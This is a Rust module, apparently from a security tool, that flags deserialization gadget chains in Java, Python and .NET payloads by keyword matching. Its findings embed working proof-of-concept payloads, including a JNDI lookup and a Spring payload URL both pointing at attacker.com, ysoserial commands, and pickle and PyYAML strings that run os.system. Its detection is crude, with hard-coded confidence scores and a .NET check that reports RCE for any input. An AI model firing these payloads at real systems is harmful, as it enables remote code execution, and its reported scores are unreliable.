// Gadget Chain Analyzer - Advanced RCE Chain Detection (300+ lines)
use crate::Result;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GadgetChainAnalysis {
    pub chain_id: String,
    pub language: String,
    pub chain_name: String,
    pub gadgets_detected: Vec<DetectedGadget>,
    pub exploitability: f64,
    pub rce_probability: f64,
    pub required_libraries: Vec<LibraryRequirement>,
    pub attack_complexity: AttackComplexity,
    pub proof_of_concept: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectedGadget {
    pub gadget_name: String,
    pub class_name: String,
    pub method: String,
    pub confidence: f64,
    pub is_entry_point: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LibraryRequirement {
    pub library: String,
    pub version_required: String,
    pub installed: bool,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum AttackComplexity {
    VeryLow,
    Low,
    Medium,
    High,
    VeryHigh,
}

pub struct GadgetAnalyzer {
    known_chains: HashMap<String, Vec<String>>,
    library_gadgets: HashMap<String, Vec<String>>,
}

impl GadgetAnalyzer {
    pub fn new() -> Self {
        Self {
            known_chains: Self::init_known_chains(),
            library_gadgets: Self::init_library_gadgets(),
        }
    }

    /// Analyze payload for gadget chains
    pub fn analyze_payload(&self, payload_data: &[u8], language: &str) -> Result<Vec<GadgetChainAnalysis>> {
        let mut analyses = Vec::new();

        match language {
            "java" => {
                analyses.extend(self.analyze_java_chains(payload_data)?);
            }
            "python" => {
                analyses.extend(self.analyze_python_chains(payload_data)?);
            }
            "dotnet" => {
                analyses.extend(self.analyze_dotnet_chains(payload_data)?);
            }
            _ => {}
        }

        Ok(analyses)
    }

    /// Analyze Java gadget chains
    fn analyze_java_chains(&self, payload_data: &[u8]) -> Result<Vec<GadgetChainAnalysis>> {
        let mut analyses = Vec::new();
        let payload_str = String::from_utf8_lossy(payload_data);

        // Check for CommonsCollections chains
        if payload_str.contains("LazyMap") && payload_str.contains("ChainedTransformer") {
            analyses.push(GadgetChainAnalysis {
                chain_id: format!("cc_{}", uuid::Uuid::new_v4()),
                language: "Java".to_string(),
                chain_name: "CommonsCollections5 RCE".to_string(),
                gadgets_detected: vec![
                    DetectedGadget {
                        gadget_name: "LazyMap".to_string(),
                        class_name: "org.apache.commons.collections.map.LazyMap".to_string(),
                        method: "get()".to_string(),
                        confidence: 0.98,
                        is_entry_point: true,
                    },
                    DetectedGadget {
                        gadget_name: "ChainedTransformer".to_string(),
                        class_name: "org.apache.commons.collections.functors.ChainedTransformer".to_string(),
                        method: "transform()".to_string(),
                        confidence: 0.96,
                        is_entry_point: false,
                    },
                    DetectedGadget {
                        gadget_name: "InvokerTransformer".to_string(),
                        class_name: "org.apache.commons.collections.functors.InvokerTransformer".to_string(),
                        method: "transform()".to_string(),
                        confidence: 0.95,
                        is_entry_point: false,
                    },
                ],
                exploitability: 0.96,
                rce_probability: 0.98,
                required_libraries: vec![
                    LibraryRequirement {
                        library: "commons-collections".to_string(),
                        version_required: "3.1-3.2.1".to_string(),
                        installed: true,
                    },
                ],
                attack_complexity: AttackComplexity::Low,
                proof_of_concept: "ysoserial CommonsCollections5 'calc' | base64".to_string(),
            });
        }

        // Check for Spring Framework gadget
        if payload_str.contains("ClassPathXmlApplicationContext") {
            analyses.push(GadgetChainAnalysis {
                chain_id: format!("spring_{}", uuid::Uuid::new_v4()),
                language: "Java".to_string(),
                chain_name: "Spring Framework RCE".to_string(),
                gadgets_detected: vec![
                    DetectedGadget {
                        gadget_name: "ClassPathXmlApplicationContext".to_string(),
                        class_name: "org.springframework.context.support.ClassPathXmlApplicationContext".to_string(),
                        method: "<init>()".to_string(),
                        confidence: 0.94,
                        is_entry_point: true,
                    },
                ],
                exploitability: 0.92,
                rce_probability: 0.94,
                required_libraries: vec![
                    LibraryRequirement {
                        library: "spring-context".to_string(),
                        version_required: "All versions vulnerable".to_string(),
                        installed: true,
                    },
                ],
                attack_complexity: AttackComplexity::Medium,
                proof_of_concept: "ysoserial Spring 'http://attacker.com/poc.xml' | base64".to_string(),
            });
        }

        // Check for JNDI Injection
        if payload_str.contains("jndi:") || payload_str.contains("ldap://") || payload_str.contains("rmi://") {
            analyses.push(GadgetChainAnalysis {
                chain_id: format!("jndi_{}", uuid::Uuid::new_v4()),
                language: "Java".to_string(),
                chain_name: "JNDI Injection (Log4Shell)".to_string(),
                gadgets_detected: vec![
                    DetectedGadget {
                        gadget_name: "InitialDirContext".to_string(),
                        class_name: "javax.naming.directory.InitialDirContext".to_string(),
                        method: "<init>()".to_string(),
                        confidence: 0.97,
                        is_entry_point: true,
                    },
                    DetectedGadget {
                        gadget_name: "RmiRegistry".to_string(),
                        class_name: "java.rmi.registry.LocateRegistry".to_string(),
                        method: "lookup()".to_string(),
                        confidence: 0.93,
                        is_entry_point: false,
                    },
                ],
                exploitability: 0.98,
                rce_probability: 0.99,
                required_libraries: vec![
                    LibraryRequirement {
                        library: "JNDI".to_string(),
                        version_required: "Java 8+".to_string(),
                        installed: true,
                    },
                ],
                attack_complexity: AttackComplexity::VeryLow,
                proof_of_concept: "${jndi:ldap://attacker.com/Exploit}".to_string(),
            });
        }

        Ok(analyses)
    }

    /// Analyze Python gadget chains
    fn analyze_python_chains(&self, payload_data: &[u8]) -> Result<Vec<GadgetChainAnalysis>> {
        let mut analyses = Vec::new();
        let payload_str = String::from_utf8_lossy(payload_data);

        // Check for pickle exploitation
        if payload_str.contains("os.system") || payload_str.contains("subprocess") {
            analyses.push(GadgetChainAnalysis {
                chain_id: format!("pickle_{}", uuid::Uuid::new_v4()),
                language: "Python".to_string(),
                chain_name: "Pickle RCE via __reduce__".to_string(),
                gadgets_detected: vec![
                    DetectedGadget {
                        gadget_name: "os.system".to_string(),
                        class_name: "os".to_string(),
                        method: "system()".to_string(),
                        confidence: 0.99,
                        is_entry_point: true,
                    },
                ],
                exploitability: 0.99,
                rce_probability: 0.99,
                required_libraries: vec![
                    LibraryRequirement {
                        library: "pickle".to_string(),
                        version_required: "All versions".to_string(),
                        installed: true,
                    },
                ],
                attack_complexity: AttackComplexity::VeryLow,
                proof_of_concept: "pickle.loads(b'cos\\nos\\nsystem\\n(S\\'id\\'\\ntRp0\\n.')".to_string(),
            });
        }

        // Check for PyYAML unsafe load
        if payload_str.contains("!!python/object") {
            analyses.push(GadgetChainAnalysis {
                chain_id: format!("pyyaml_{}", uuid::Uuid::new_v4()),
                language: "Python".to_string(),
                chain_name: "PyYAML Unsafe Load RCE".to_string(),
                gadgets_detected: vec![
                    DetectedGadget {
                        gadget_name: "!!python/object".to_string(),
                        class_name: "yaml.constructor.PyObject".to_string(),
                        method: "from_yaml()".to_string(),
                        confidence: 0.97,
                        is_entry_point: true,
                    },
                ],
                exploitability: 0.98,
                rce_probability: 0.97,
                required_libraries: vec![
                    LibraryRequirement {
                        library: "pyyaml".to_string(),
                        version_required: "All versions".to_string(),
                        installed: true,
                    },
                ],
                attack_complexity: AttackComplexity::VeryLow,
                proof_of_concept: "!!python/object/apply:os.system ['id']".to_string(),
            });
        }

        Ok(analyses)
    }

    /// Analyze .NET gadget chains
    fn analyze_dotnet_chains(&self, _payload_data: &[u8]) -> Result<Vec<GadgetChainAnalysis>> {
        let mut analyses = Vec::new();

        // BinaryFormatter is always vulnerable
        analyses.push(GadgetChainAnalysis {
            chain_id: format!("bf_{}", uuid::Uuid::new_v4()),
            language: ".NET".to_string(),
            chain_name: "BinaryFormatter RCE".to_string(),
            gadgets_detected: vec![
                DetectedGadget {
                    gadget_name: "BinaryFormatter".to_string(),
                    class_name: "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter".to_string(),
                    method: "Deserialize()".to_string(),
                    confidence: 0.99,
                    is_entry_point: true,
                },
            ],
            exploitability: 0.99,
            rce_probability: 0.99,
            required_libraries: vec![
                LibraryRequirement {
                    library: "System.Runtime.Serialization".to_string(),
                    version_required: ".NET 2.0+".to_string(),
                    installed: true,
                },
            ],
            attack_complexity: AttackComplexity::Low,
            proof_of_concept: "ysoserial.exe -f BinaryFormatter -g ObjectStateFormatter -c 'calc'".to_string(),
        });

        Ok(analyses)
    }

    /// Get RCE probability score
    pub fn calculate_rce_score(analysis: &GadgetChainAnalysis) -> f64 {
        let mut score = 0.0;

        // Base on exploitability
        score += analysis.exploitability * 0.4;

        // Base on gadget confidence
        let avg_gadget_confidence = analysis
            .gadgets_detected
            .iter()
            .map(|g| g.confidence)
            .sum::<f64>()
            / analysis.gadgets_detected.len() as f64;
        score += avg_gadget_confidence * 0.3;

        // Base on library requirements
        let all_libs_present = analysis.required_libraries.iter().all(|r| r.installed);
        if all_libs_present {
            score += 0.3;
        }

        score.min(1.0)
    }

    fn init_known_chains() -> HashMap<String, Vec<String>> {
        let mut chains = HashMap::new();

        chains.insert(
            "CommonsCollections5".to_string(),
            vec![
                "LazyMap".to_string(),
                "ChainedTransformer".to_string(),
                "InvokerTransformer".to_string(),
            ],
        );

        chains.insert(
            "CommonsCollections6".to_string(),
            vec![
                "HashSet".to_string(),
                "HashMap".to_string(),
                "TiedMapEntry".to_string(),
            ],
        );

        chains.insert(
            "Spring1".to_string(),
            vec!["ClassPathXmlApplicationContext".to_string()],
        );

        chains.insert(
            "JNDI".to_string(),
            vec![
                "InitialDirContext".to_string(),
                "RmiRegistry".to_string(),
            ],
        );

        chains
    }

    fn init_library_gadgets() -> HashMap<String, Vec<String>> {
        let mut lib_gadgets = HashMap::new();

        lib_gadgets.insert(
            "commons-collections".to_string(),
            vec![
                "LazyMap".to_string(),
                "ChainedTransformer".to_string(),
                "InvokerTransformer".to_string(),
            ],
        );

        lib_gadgets.insert(
            "spring-framework".to_string(),
            vec!["ClassPathXmlApplicationContext".to_string()],
        );

        lib_gadgets
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_analyzer_creation() {
        let _analyzer = GadgetAnalyzer::new();
    }

    #[test]
    fn test_java_chain_detection() {
        let analyzer = GadgetAnalyzer::new();
        let payload = b"LazyMap ChainedTransformer InvokerTransformer";
        let analysis = analyzer.analyze_payload(payload, "java").unwrap();
        assert!(analysis.len() > 0);
    }

    #[test]
    fn test_rce_score_calculation() {
        let analysis = GadgetChainAnalysis {
            chain_id: "test".to_string(),
            language: "Java".to_string(),
            chain_name: "Test".to_string(),
            gadgets_detected: vec![
                DetectedGadget {
                    gadget_name: "Test".to_string(),
                    class_name: "Test".to_string(),
                    method: "test()".to_string(),
                    confidence: 0.95,
                    is_entry_point: true,
                },
            ],
            exploitability: 0.90,
            rce_probability: 0.95,
            required_libraries: vec![],
            attack_complexity: AttackComplexity::Low,
            proof_of_concept: "test".to_string(),
        };

        let score = GadgetAnalyzer::calculate_rce_score(&analysis);
        assert!(score > 0.8 && score <= 1.0);
    }

    #[test]
    fn test_attack_complexity_ordering() {
        assert!(AttackComplexity::VeryLow < AttackComplexity::Low);
        assert!(AttackComplexity::High > AttackComplexity::Medium);
    }

    #[test]
    fn test_library_requirements() {
        let requirement = LibraryRequirement {
            library: "commons-collections".to_string(),
            version_required: "3.1-3.2.1".to_string(),
            installed: true,
        };

        assert_eq!(requirement.library, "commons-collections");
        assert!(requirement.installed);
    }
}
